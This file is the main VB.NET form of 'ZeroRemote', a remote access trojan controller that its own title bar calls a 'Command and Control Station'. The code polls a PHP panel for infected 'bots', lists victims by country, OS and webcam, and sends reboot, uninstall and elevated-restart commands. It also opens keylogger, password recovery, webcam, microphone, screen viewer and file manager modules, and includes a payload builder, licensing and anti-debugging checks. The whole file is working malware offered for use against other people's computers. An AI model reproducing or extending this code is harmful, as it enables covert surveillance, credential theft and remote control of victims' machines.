
Imports System.IO
Imports System.Net
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Globalization
Imports System.Text
Imports System.Reflection
Imports System.Linq.Expressions

Public Class Main


    Public Status As Boolean = False
    Public SelectedUserID As String = Nothing
    Public AuthentificationKey As String = "12345" 'This key is used for webrequest to prevent other people manipulating traffic. When changed it need to be changed in the PHP Files too!
    'Dim Instance As Type
    Public ShowClientNotification As Boolean = True

    Public Property HostAdress As String
        Set(value As String)
            Hostings.Host = value
        End Set
        Get
            Return Hostings.Host
        End Get
    End Property


#Region "NETSEAL"

    Sub New()
        Seal = New License
        Seal.ID = "52360000"
        Seal.ValidateCore = True
        Seal.Catch = False
        Seal.RunHook = AddressOf InitApp
        Seal.BanHook = AddressOf BanHook
        Seal.Initialize()
    End Sub

    Private Sub BanHook()
        Seal.BanCurrentUser("Cracking attempt prevented. License banned. No refund will be given.")
    End Sub

    Private Sub EnableProtection()
        Seal.Protection = RuntimeProtection.Debuggers And RuntimeProtection.DebuggersEx And RuntimeProtection.VirtualMachine
    End Sub

    Private Sub InitApp()
        EnableProtection()
        InitializeComponent()

        '------------------- Get Netseal Username & Expirationdate -------------------
        Dim ExpirationDate As String = Seal.ExpirationDate.ToShortDateString
        Dim Username As String = Seal.Username

        AboutAndCredits.LabelAccountExpiration.Text = ExpirationDate
        AboutAndCredits.LabelAccountName.Text = Seal.Username

        If ExpirationDate.ToString.Contains("9000") Then
            AboutAndCredits.LabelAccountExpiration.Text = "Never"
        End If
        '------------------------------------------------------------------------------

        'HashCheck(Seal.GetVariable("ZeroRemoteHashv1100"))
        'If String.IsNullOrEmpty(Seal.Username) Then
        '    Seal.BanCurrentUser("No User has authenticated." & vbNewLine & "Modifications in the NetSeal class have been made." & "Cracking attempt prevented.")
        'End If
    End Sub

    Public Function MD5CalcFile(ByVal filepath As String) As String
        Using reader As New System.IO.FileStream(filepath, IO.FileMode.Open, IO.FileAccess.Read)
            Using md5 As New System.Security.Cryptography.MD5CryptoServiceProvider
                Dim hash() As Byte = md5.ComputeHash(reader)
                Return ByteArrayToString(hash)
            End Using
        End Using
    End Function

    Private Function ByteArrayToString(ByVal arrInput() As Byte) As String
        Dim sb As New System.Text.StringBuilder(arrInput.Length * 2)
        For i As Integer = 0 To arrInput.Length - 1
            sb.Append(arrInput(i).ToString("X2"))
        Next
        Return sb.ToString().ToLower
    End Function

    Private Sub HashCheck(ByVal hash As String)
        If Not String.Compare(hash, MD5CalcFile(Application.ExecutablePath), StringComparison.OrdinalIgnoreCase) = 0 Then
            Seal.BanCurrentUser("ZeroRemote assembly was modified." & vbNewLine & "Cracking attempt prevented." & vbNewLine & "Hash of modified file: " & MD5CalcFile(Application.ExecutablePath))
        End If
    End Sub

#End Region


#Region "Connection & Communication"


    Private Sub AnalyzeConnectedUser()
        Try
            Dim NF As Notification
            Dim Userlist As New List(Of String)
            If ListViewMain.Items.Count > 0 Then
                For Each Item As ListViewItem In ListViewMain.Items
                    Userlist.Add(Item.SubItems(4).Text)
                Next
                If Userlist.Any(Function(d) d <> Userlist(0)) Then
                    If ShowClientNotification = True Then
                        NF = New Notification("ZeroRemote - New clients connected", ListViewMain.Items.Count.ToString + " client(s) connected from different" & vbNewLine & "countries.")
                        Invoke(New MethodInvoker(Sub()
                                                     NF.Show()
                                                 End Sub))
                        Dim ShowNotification As New System.Threading.Thread(Sub()
                                                                                Invoke(New MethodInvoker(Sub()
                                                                                                             NF.MoveUp()
                                                                                                         End Sub))
                                                                            End Sub)
                        ShowNotification.Start()
                    End If


                    My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
                Else
                    If ShowClientNotification = True Then
                        NF = New Notification("ZeroRemote - New clients connected", ListViewMain.Items.Count.ToString + " client(s) connected from" & vbNewLine & ListViewMain.Items(0).SubItems(4).Text & ".")
                        Invoke(New MethodInvoker(Sub()
                                                     NF.Show()
                                                 End Sub))
                        Dim ShowNotification As New System.Threading.Thread(Sub()
                                                                                Invoke(New MethodInvoker(Sub()
                                                                                                             NF.MoveUp()
                                                                                                         End Sub))
                                                                            End Sub)
                        ShowNotification.Start()
                    End If
                    My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
                End If
            End If
            Userlist.Clear()
        Catch ex As Exception
            For Each Item As ListViewItem In ListViewMain.Items
                If Item.SubItems(0).Text.Contains("<html><head><script type=") Then
                    MsgBox("This host runs Javascript is not useable for ZeroRemote. Please use a different hosting provider.", MsgBoxStyle.Exclamation, "Host error")
                    DisconnectToolStripMenuItem.PerformClick()
                End If
            Next
        End Try

    End Sub

    Public Sub Connect()
        Try
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=admin&key=" & AuthentificationKey)
            request.Method = "POST"
            Dim postData As String = ""
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            If responseFromServer = "Connection error" Then
                ToolStripMenuItem1.Enabled = True
                Status = False
                SetStatus(CType(1, MyStatus))
                Exit Sub
            End If
            SplitUserlist(responseFromServer)
            reader.Close()
            dataStream.Close()
            response.Close()
            RemoveEmptyUsers()
            CheckForIllegalCrossThreadCalls = False
            ToolStripUsersOnline.Text = "  Connections: " & ListViewMain.Items.Count
            Status = True
            SetStatus(0)
            ToolStripMenuItem1.Enabled = True
        Catch ex As WebException
            Settings.AddLog("Failed", Settings.State.Failed, "Unable to connect to server.")
            CheckForIllegalCrossThreadCalls = False 'srsly ?
            ToolStripMenuItem1.Enabled = True
            Status = False
            SetStatus(CType(1, MyStatus))
            DisconnectToolStripMenuItem.PerformClick()
            MessageBox.Show("Unable to connect to " & HostAdress & vbNewLine & "Make sure you are connected to the internet and your" & vbNewLine & "webserver has been setup correctly.", "Connection failed", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
        Settings.GraphConnections.AddValue(CSng(ListViewMain.Items.Count))


        If Settings.CheckBoxShowNotification.CheckState = CheckState.Checked Then
            AnalyzeConnectedUser()
        Else
            Settings.CheckBoxShowNotification.CheckState = CheckState.Unchecked
        End If



    End Sub

    Public Sub WriteCommand(ByVal cmd As String)
RetryLoad:
        Try
            Waiting.UpdateStatus("Sending Command...", WaitingStatus.Uploading)
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=writecmd")
            request.Method = "POST"
            Dim postData As String = "Data=" & String2Hex(cmd)
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
            RemoveEmptyUsers()
            Status = True
            SetStatus(0)
        Catch
            Status = False
            SetStatus(CType(1, MyStatus))
            GoTo RetryLoad
        End Try
    End Sub

    Public Sub WriteData(ByVal data As String)
RetryLoad:
        Try
            Waiting.UpdateStatus("Sending Data...", WaitingStatus.Uploading)
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=writedata")
            request.Method = "POST"
            Dim postData As String = "Data=" & String2Hex(data)
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
            RemoveEmptyUsers()
            Status = True
            SetStatus(0)
        Catch ex As Exception
            Status = False
            SetStatus(CType(1, MyStatus))
            GoTo RetryLoad
        End Try
    End Sub

    Public Function ReadData() As String 'all these functions work aside the readresponse (they are all using the same var...)
        Try
            Waiting.UpdateStatus("Reading Data...", WaitingStatus.Downloading)
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=readdata")
            request.Method = "POST"
            Dim postData As String = ""
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
            RemoveEmptyUsers()
            Status = True
            SetStatus(0)
            Return Hex2String(responseFromServer)
        Catch ex As WebException
            Status = False
            SetStatus(CType(1, MyStatus))
            MessageBox.Show(ex.Message, "Webexception occured", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Return Nothing
        End Try
    End Function

    Public Function ReadDataNoEncryption() As String
        Try
            Waiting.UpdateStatus("Reading Data...", WaitingStatus.Downloading)
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=readdata")
            request.Method = "POST"
            Dim postData As String = ""
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
            RemoveEmptyUsers()
            Status = True
            SetStatus(0)
            Return responseFromServer
        Catch ex As WebException
            Status = False
            SetStatus(CType(1, MyStatus))
            Return Nothing
        End Try
    End Function

    Public Function CleanResponse() As String
        Try
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=clearresponse")
            request.Method = "POST"
            Dim postData As String = ""
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            Return responseFromServer
            reader.Close()
            dataStream.Close()
            response.Close()
            RemoveEmptyUsers()
            Status = True
            SetStatus(0)
        Catch
            Return Nothing
            Status = False
            SetStatus(CType(1, MyStatus))
            MsgBox("Unable to read command.")
        End Try
    End Function

    Public Function ReadResponse() As String
        Try
            Waiting.UpdateStatus("Downloading Response...", WaitingStatus.Downloading)
            Dim GetWebRequest As WebRequest = WebRequest.Create(HostAdress & "/response.dat")
            Dim response As WebResponse = GetWebRequest.GetResponse()
            Dim dataStream As Stream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            response.Close()

            Waiting.UpdateStatus("Recieved Response.", WaitingStatus.Downloading)
            Status = True
            SetStatus(0)

            Return Hex2String(responseFromServer)
        Catch ex As Exception
            Status = False
            SetStatus(CType(1, MyStatus))

            Return Nothing
        End Try
    End Function

    Public Sub SplitUserlist(ByVal Userlist As String)
        CheckForIllegalCrossThreadCalls = False
        DoubleBuffering(ListViewMain, True)
        ListViewMain.Items.Clear()
        For Each line In Userlist.Split({vbNewLine}, StringSplitOptions.None)
            Dim parts() = line.Split({"|||"}, StringSplitOptions.None)
            Dim item As ListViewItem = ListViewMain.Items.Add(parts(0))
            For i = 1 To Math.Min(parts.Length - 1, 6)
                If i = 4 Then
                    item.ImageIndex = ImageListFlags.Images.IndexOfKey(LCase(parts(i).Split(New Char() {"("c, ")"c})(1)) & ".png")
                End If
                item.SubItems.Add(parts(i))
                Invoke(New MethodInvoker(Sub() Me.ToolStripUsersOnline.Text = "Connections: " & CType(Me.ListViewMain.Items.Count, String)))
            Next
            DoubleBuffering(ListViewMain, False)
        Next
        CheckForIllegalCrossThreadCalls = True
    End Sub

    Public Sub RemoveDeadBot(ByVal Authentificationkey As String, ByVal GUID As String)
RetryDisconnect:
        Try
            Dim request As WebRequest = WebRequest.Create(HostAdress & "/main.php?cmd=disconnect&key=" & Authentificationkey)
            request.Method = "POST"
            Dim postData As String = "ID=" & GUID
            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
            request.ContentType = "application/x-www-form-urlencoded"
            request.ContentLength = byteArray.Length
            Dim dataStream As Stream = request.GetRequestStream()
            dataStream.Write(byteArray, 0, byteArray.Length)
            dataStream.Close()
            Dim response As WebResponse = request.GetResponse()
            dataStream = response.GetResponseStream()
            Dim reader As New StreamReader(dataStream)
            Dim responseFromServer As String = reader.ReadToEnd()
            reader.Close()
            dataStream.Close()
            response.Close()
        Catch ex As Exception
            GoTo RetryDisconnect
        End Try
    End Sub

    Public Sub AutoRefresh()
        If ConnectToToolStripMenuItem.DropDownItems.Count < 1 Then
            MessageBox.Show("You have no hosts in the list.", "No hosts", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            Settings.CheckBoxautorefresh.Checked = False
            Exit Sub
        End If
        Do
            HostAdress = ConnectToToolStripMenuItem.DropDownItems(0).Text
            Connect()
            System.Threading.Thread.Sleep(20000)
        Loop
    End Sub

    Public Enum MyStatus
        Enabled = 0
        Disabled = 1
        Connecting = 2
        Unknown = 3
    End Enum

    Public Sub SetStatus(ByVal MyStatus As MyStatus)
        If ToolStripStatus IsNot Nothing Then
            Dim m = New MethodInvoker(Sub()
                                          If MyStatus = 0 Then
                                              ToolStripStatus.ForeColor = Color.Green
                                              ToolStripStatus.Text = "Enabled"
                                          ElseIf MyStatus = 1 Then
                                              ToolStripStatus.ForeColor = Color.Red
                                              ToolStripStatus.Text = "Disabled"
                                          ElseIf MyStatus = 2 Then
                                              ToolStripStatus.ForeColor = Color.Orange
                                              ToolStripStatus.Text = "Connecting..."
                                          ElseIf MyStatus = 3 Then
                                              ToolStripStatus.ForeColor = Color.DarkGray
                                              ToolStripStatus.Text = "Unknown"
                                          End If
                                      End Sub)

            If StatusStrip1.InvokeRequired Then
                StatusStrip1.Invoke(m)
            Else
                m.Invoke()
            End If
        End If

    End Sub

    Public Sub RemoveEmptyUsers()
        CheckForIllegalCrossThreadCalls = False
        For Each Item As ListViewItem In Me.ListViewMain.Items
            If (Item.Text = "") Or (String.IsNullOrWhiteSpace(Item.Text)) Then
                Item.Remove()
            End If
        Next
    End Sub

#End Region

#Region "DoubleBuffer ListView"

    Public Shared Sub DoubleBuffering(control As Control, enable As Boolean)
        Dim method = GetType(Control).GetMethod("SetStyle", BindingFlags.Instance Or BindingFlags.NonPublic)
        method.Invoke(control, New Object() {ControlStyles.OptimizedDoubleBuffer, enable})
    End Sub
#End Region

#Region "Grouping"
    Public Sub GroupListView(ByVal lstV As ListView, ByVal SubItemIndex As Int16)
        Try
            Dim flag As Boolean = True
            For Each l As ListViewItem In lstV.Items
                Dim strmyGroupname As String = l.SubItems(SubItemIndex).Text
                For Each lvg As ListViewGroup In lstV.Groups
                    If lvg.Name = strmyGroupname Then
                        l.Group = lvg
                        flag = False
                    End If
                Next
                If flag = True Then
                    Dim lstGrp As New ListViewGroup(strmyGroupname, strmyGroupname)
                    lstV.Groups.Add(lstGrp)
                    l.Group = lstGrp
                End If
                flag = True
            Next
        Catch
            lstV.ShowGroups = False
        End Try
    End Sub
#End Region

#Region "Encryption"
    Public Function String2Hex(s As String) As String
        Return String.Concat(Encoding.UTF8.GetBytes(s).Select(Function(b) b.ToString("X2")).ToArray())
    End Function

    Public Function Hex2String(s As String) As String
        Dim bytes(s.Length \ 2 - 1) As Byte
        For i = 0 To bytes.Length - 1
            bytes(i) = Byte.Parse(s.Substring(i * 2, 2), NumberStyles.HexNumber)
        Next
        Return Encoding.UTF8.GetString(bytes)
    End Function
#End Region

#Region "Buttons & Controls"

    Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrophoneToolStripMenuItem.Click
        Microphone.ShowDialog()
    End Sub

    Private Sub StartupMonitorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartupMonitorToolStripMenuItem.Click
        StartupMonitor.ShowDialog()
    End Sub

    Private Sub DownloadmanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadmanagerToolStripMenuItem.Click
        Downloadmanager.ShowDialog()
    End Sub

    Private Sub DeleteFromDatabaseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFromDatabaseToolStripMenuItem.Click
        If MessageBox.Show("Are you sure you like to remove this user?" & vbNewLine & "To delete a server from a controlled computer please" & vbNewLine & "use the uninstall function." & vbNewLine & "Use the remove function only to delete dead bots.", "Remove Server", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) = Windows.Forms.DialogResult.Yes Then
            RemoveDeadBot(AuthentificationKey, ListViewMain.SelectedItems(0).Text)
            MsgBox("Removed dead bot from the list.", MsgBoxStyle.Information)
            Connect()
        End If
    End Sub

    Private Sub NetworkviewerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NetworkviewerToolStripMenuItem.Click
        Networkviewer.ShowDialog()
    End Sub

    Private Sub FunmanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FunmanagerToolStripMenuItem.Click
        MiscFunctions.ShowDialog()
    End Sub

    Private Sub MessageBoxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessageBoxToolStripMenuItem.Click
        MessageBoxManager.ShowDialog()
    End Sub

    Private Sub RebootAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RebootAllToolStripMenuItem.Click
        Try
RetryRebootAll:
            WriteCommand("ALL|98")
            MsgBox("Sent Command to reboot all computers. Please wait a few seconds, then refresh the list.", MsgBoxStyle.Information)
            System.Threading.Thread.Sleep(5000)
            CleanResponse()
            WriteCommand(String.Empty)
        Catch x As Exception
            GoTo RetryRebootAll
        End Try
    End Sub

    Private Sub RegistrymanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RegistrymanagerToolStripMenuItem.Click
        Registrymanager.ShowDialog()
    End Sub

    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click
        Settings.ShowDialog()
    End Sub

    Private Sub GroupByCountryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GroupByCountryToolStripMenuItem.Click
        ListViewMain.ShowGroups = True
        GroupListView(ListViewMain, 4)
    End Sub

    Private Sub GroupByWebcamToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GroupByWebcamToolStripMenuItem.Click
        ListViewMain.ShowGroups = True
        GroupListView(ListViewMain, 6)
    End Sub

    Private Sub ShowNoGroupsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowNoGroupsToolStripMenuItem.Click
        ListViewMain.ShowGroups = False
    End Sub

    Private Sub ScreenviewerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ScreenviewerToolStripMenuItem.Click
        Screenviewer.ShowDialog()
    End Sub

    Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Application.Exit()
    End Sub

    Private Sub WebcamviewerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WebcamviewerToolStripMenuItem.Click
        Webcamviewer.ShowDialog()
    End Sub

    Private Sub GroupByOSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GroupByOSToolStripMenuItem.Click
        ListViewMain.ShowGroups = True
        GroupListView(ListViewMain, 3)
    End Sub


    Private Sub UninstallAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallAllToolStripMenuItem.Click
        Try
RetryUninstallAll:
            WriteCommand("ALL|99")
            MsgBox("Sent Command to Uninstall users. Please wait a 5 seconds, then refresh the list.", MsgBoxStyle.Information)
            System.Threading.Thread.Sleep(5000)
            CleanResponse()
            WriteCommand(String.Empty)
        Catch x As Exception
            GoTo RetryUninstallAll
        End Try
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        ListViewMain.Items.Clear()
        ToolStripUsersOnline.Text = "  Connections: " & ListViewMain.Items.Count
        Status = False
        SetStatus(CType(1, MyStatus))
    End Sub


    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        AboutAndCredits.ShowDialog()
    End Sub

    Private Sub CreateServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateServerToolStripMenuItem.Click
        Try
            Builder.ShowDialog()
        Catch ex As InvalidOperationException
            MsgBox("There was a problem opening the Builder." & vbNewLine & "We are sorry for this incident" & vbNewLine & "Please restart ZeroRemote and try again.", MsgBoxStyle.Critical, "Failed opening Builder")
        End Try
    End Sub

    Private Sub ListViewMain_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListViewMain.SelectedIndexChanged
        If ListViewMain.Items.Count > 0 Then
            If ListViewMain.SelectedItems.Count <> 0 Then _
                SelectedUserID = ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("Select User!")
            Exit Sub
        End If

    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        If ListViewMain.Items.Count > 0 Then
            If ListViewMain.SelectedItems.Count <> 0 Then _
                SelectedUserID = ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If

        Try
            WriteCommand(SelectedUserID & "|1")
            Using waitingDialog As New Waiting()
                waitingDialog.ShowDialog()
            End Using
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "closetoolstrip")
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        Dim UserID As String = ListViewMain.SelectedItems(0).Text
        Try
            WriteCommand(UserID & "|2")
            Using waitingDialog As New Waiting()
                waitingDialog.ShowDialog()

            End Using
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "restarttoolstrip")
        End Try
    End Sub


    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim UserID As String = ListViewMain.SelectedItems(0).Text
        Try
            WriteCommand(UserID & "|4")
            Using waitingDialog As New Waiting()
                waitingDialog.ShowDialog()
            End Using
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "uninstalltoolstrip")
        End Try
    End Sub

    Private Sub ContextMenuStripOptions_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStripOptions.Opening
        If ListViewMain.Items.Count = 0 Then
            e.Cancel = True
        Else
            If ListViewMain.SelectedItems.Count = 0 Then
                e.Cancel = True
            End If
        End If
    End Sub

    Private Sub RestartAsAdminToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartAsAdminToolStripMenuItem.Click
        Dim MsgBoxResult = MessageBox.Show("This will restart your server with elevated" & vbNewLine & "privileges (Admin). On Vista or newer systems this" & vbNewLine & "will trigger the UAC to popup. If the User" & vbNewLine & "clicks 'Yes', Server will restart elevated, otherwise" & vbNewLine & "server will not restart if the user clicks 'no'." & vbNewLine & "Do you like to continue?", "Restart Elevated", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
        If MsgBoxResult = Windows.Forms.DialogResult.Yes Then
            Dim UserID As String = ListViewMain.SelectedItems(0).Text
            Try
                WriteCommand(UserID & "|3")

                Using WD As New Waiting()
                    WD.ShowDialog()
                End Using
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Restart Elevated")
            End Try
        End If
    End Sub

    Private Sub WindowmanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WindowmanagerToolStripMenuItem.Click
        Windowmanager.ShowDialog()
    End Sub

    Private Sub FilemanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FilemanagerToolStripMenuItem.Click
        Filemanager.ShowDialog()
    End Sub
    Private Sub ProcessmanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProcessmanagerToolStripMenuItem.Click
        Processmanager.ShowDialog()
    End Sub

    Private Sub ServicemanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ServicemanagerToolStripMenuItem.Click
        Servicemanager.ShowDialog()
    End Sub

    Private Sub SysteminformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SysteminformationToolStripMenuItem.Click
        Systeminformation.ShowDialog()
    End Sub

    Private Sub ServerinformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ServerinformationToolStripMenuItem.Click
        Serverinformation.ShowDialog()
    End Sub

    Private Sub ClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClipboardToolStripMenuItem.Click
        Clipboard.ShowDialog()
    End Sub

    Private Sub SoftwaremanagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SoftwaremanagerToolStripMenuItem.Click
        Softwaremanager.ShowDialog()
    End Sub

    Private Sub PasswordRecoveryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordRecoveryToolStripMenuItem.Click
        PasswordRecovery.ShowDialog()
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Keylogger.ShowDialog()
    End Sub
    Public Sub AddHost(a As Object, B As EventArgs)
        HostAdress = DirectCast(a, ToolStripMenuItem).Text 'over here i assume
        'HostAdress = Me.NewHostItem.Text
        Connect()
    End Sub


    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        If String.IsNullOrEmpty(Seal.Username) Then
            Environment.FailFast("Application launched without user authenticated.")
        End If

        If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\ZeroHosts.txt") Then 'load the hosts.txt file
            Dim Hosts As String() = ApplicationSettings.RijndaelDecrypt(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\ZeroHosts.txt")).Split(CChar("|||"))
            For Each Host In Hosts
                If Not String.IsNullOrEmpty(Host) Then
                    Settings.ListViewHosts.Items.Add(Host, 1)

                    Dim NewHostItem As ToolStripMenuItem
                    NewHostItem = New ToolStripMenuItem(Host, Settings.ImageListWerbservers.Images(0))
                    NewHostItem.Text = Host
                    AddHandler NewHostItem.Click, AddressOf AddHost
                    ConnectToToolStripMenuItem.DropDownItems.Add(NewHostItem)
                End If
            Next
        End If



        Dim NGM As NotificationGlobalMessage
        Me.Text = " ZeroRemote  |  Command and Control Station  -  Licensed to: " & Seal.Username
        Dim GlobalMessage As String = Seal.GlobalMessage
        If Not String.IsNullOrEmpty(GlobalMessage) Then
            NGM = New NotificationGlobalMessage("ZeroRemote - News & Information", GlobalMessage)
            Invoke(New MethodInvoker(Sub()
                                         NGM.Show()
                                     End Sub))
            Dim ShowGlobalMessageNotification As New System.Threading.Thread(Sub()
                                                                                 Invoke(New MethodInvoker(Sub()
                                                                                                              NGM.MoveUp()
                                                                                                          End Sub))
                                                                             End Sub)
            ShowGlobalMessageNotification.Start()
            My.Computer.Audio.Play(My.Resources.notify, AudioPlayMode.Background)
        End If
    End Sub

    Private Sub CreatePHPFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreatePHPFilesToolStripMenuItem.Click
        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\main.php", My.Resources.main)
        MessageBox.Show("The main.php file has been saved to your desktop." & vbNewLine & "Upload it to your webserver inside the 'Zero'-directory." & vbNewLine & "Before installing the server on a remote system make" & vbNewLine & "sure you have connected at least once to your webserver" & vbNewLine & "with the client so the 'Users'-folder and the" & vbNewLine & "'Uploads'-folder have been created." & vbNewLine & "After that you can start the server on a remote system.", "PHP files saved", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub ConnectToToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ConnectToToolStripMenuItem.Click
        If ConnectToToolStripMenuItem.HasDropDownItems = False Then
            MessageBox.Show("There are no webservers in the list yet. " & vbNewLine & "Please go to the settings menu and add" & vbNewLine & "your webservers there.", "No Webservers", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
        End If
    End Sub

#End Region

End Class

Class Hostings

    Public Shared Host As String

End Class
